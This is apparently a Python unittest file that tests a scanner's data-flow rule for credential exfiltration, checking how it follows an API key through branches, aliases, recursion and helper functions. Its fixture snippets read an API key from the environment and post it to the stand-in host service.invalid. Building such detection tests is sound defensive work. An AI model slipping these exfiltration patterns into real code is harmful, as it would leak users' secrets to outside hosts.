"""Branch effects preserve object identity without mixing exclusive paths."""
import unittest
from test_qindun_certify import MODULE


class PythonBranchMutationTests(unittest.TestCase):

    def test_short_circuit_conditions_skip_unvisited_calls(self):
        for expression, expected in (
            ("False and change(fields)", set()),
            ("True or change(fields)", set()),
            ("True and change(fields)", {"confirmed"}),
            ("False or change(fields)", {"confirmed"}),
            ("change(fields) if False else False", set()),
            ("False if True else change(fields)", set()),
        ):
            with self.subTest(expression=expression):
                self.analyze(
                    'fields=[]\ndef change(value):\n    value.append(key)\n    return True\n'
                    + f'if {expression}:\n    pass\n'
                    + 'requests.post("https://service.invalid",json=fields)\n', expected,
                )
        self.analyze(
            'fields=[]\nif False and unknown():\n    fields.append(key)\n'
            'requests.post("https://service.invalid",json=fields)\n', set(),
        )


    def test_recursion_distinguishes_local_results_from_shared_effects(self):
        self.analyze(
            'def walk(value):\n    records=[]\n    if enabled:\n'
            '        records.extend(walk(child))\n    return records\nwalk(data)\n', set()
        )
        for body in (
            'fields=[]\ndef change(value):\n    value.append(key)\n    change(value)\n'
            'change(fields)\n',
            'fields=[]\ndef change():\n    fields.append(key)\n    change()\nchange()\n',
        ):
            with self.subTest(body=body):
                self.analyze(
                    body + 'requests.post("https://service.invalid",json=fields)\n',
                    {"confirmed"}, partial=True,
                )

    def test_new_unaliased_branch_containers_keep_provenance(self):
        self.analyze(
            'if enabled:\n    fields=["public"]\nelse:\n    fields=["text"]\n'
            'requests.post("https://service.invalid",json=fields)\n', set(),
        )
        self.analyze(
            'if enabled:\n    fields=["public"]\nelse:\n    fields=["text"]\n'
            'fields.append(key)\nrequests.post("https://service.invalid",json=fields)\n',
            {"confirmed"},
        )

    def analyze(self, body, expected, *, partial=False):
        hits, error = MODULE._python_flow_findings("main.py", 'import os,requests\nkey=os.getenv("API_KEY")\n' + body)
        self.assertEqual(error is not None, partial)
        self.assertEqual({h.disposition for h in hits
                          if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"}, expected)

    def test_conditional_mutation_reaches_caller(self):
        for initial, mutation in (("{}", 'value["payload"]=key'),
                                  ("[]", "value.append(key)"),
                                  ("{1}", "value.add(key)")):
            for test in ("enabled", "True", "False"):
                with self.subTest(initial=initial, test=test):
                    self.analyze(
                        f'fields={initial}\ndef change(value):\n    if {test}:\n        {mutation}\n'
                        'change(fields)\nrequests.post("https://service.invalid",json=fields)\n',
                        set() if test == "False" else {"confirmed"},
                    )

    def test_exclusive_branch_does_not_see_other_branch_mutation(self):
        self.analyze(
            'fields=[]\nif enabled:\n    fields.append(key)\nelse:\n'
            '    requests.post("https://service.invalid",json=fields)\n', set()
        )

    def test_rebind_is_not_a_write_to_original(self):
        self.analyze(
            'fields=[]\ndef change(value):\n    if enabled:\n        value=[]\n'
            '        value.append(key)\nchange(fields)\n'
            'requests.post("https://service.invalid",json=fields)\n', set(), partial=True
        )

    def test_unchanged_binding_preserves_aliases_after_join(self):
        self.analyze(
            'fields=[]\nalias=fields\nif enabled:\n    pass\nelse:\n    pass\n'
            'alias.append(key)\nrequests.post("https://service.invalid",json=fields)\n',
            {"confirmed"},
        )

    def test_mutation_before_rebind_survives_without_stale_binding(self):
        self.analyze(
            'fields=[]\ndef change(value):\n    if enabled:\n        value.append(key)\n'
            '        value=[]\nchange(fields)\n'
            'requests.post("https://service.invalid",json=fields)\n', {"confirmed"}, partial=True
        )

    def test_function_invoked_in_condition_has_effect(self):
        self.analyze(
            'fields=[]\ndef change(value):\n    value.append(key)\n    return False\n'
            'if change(fields):\n    pass\n'
            'requests.post("https://service.invalid",json=fields)\n', {"confirmed"},
        )

    def test_nested_branch_and_helper_effects(self):
        self.analyze(
            'fields=[]\ndef change(value):\n    value.append(key)\n'
            'if first:\n    if second:\n        change(fields)\n'
            'requests.post("https://service.invalid",json=fields)\n', {"confirmed"},
        )

    def test_default_reference_effect_restored_between_branches(self):
        self.analyze(
            'fields=[]\ndef change(value=fields):\n    value.append(key)\n'
            'if enabled:\n    change()\nelse:\n'
            '    requests.post("https://service.invalid",json=fields)\n', set(),
        )

    def test_public_auth_and_mixed_fields(self):
        for mutation, expected in (
            ('value["public"]="text"', set()),
            ('value["Authorization"]="Bearer "+key', {"candidate"}),
            ('value["Authorization"]="Bearer "+key\n        value["body"]=key', {"confirmed"}),
        ):
            with self.subTest(mutation=mutation):
                self.analyze(
                    'fields={}\ndef change(value):\n    if enabled:\n        ' + mutation +
                    '\nchange(fields)\nrequests.post("https://service.invalid",headers=fields)\n',
                    expected,
                )
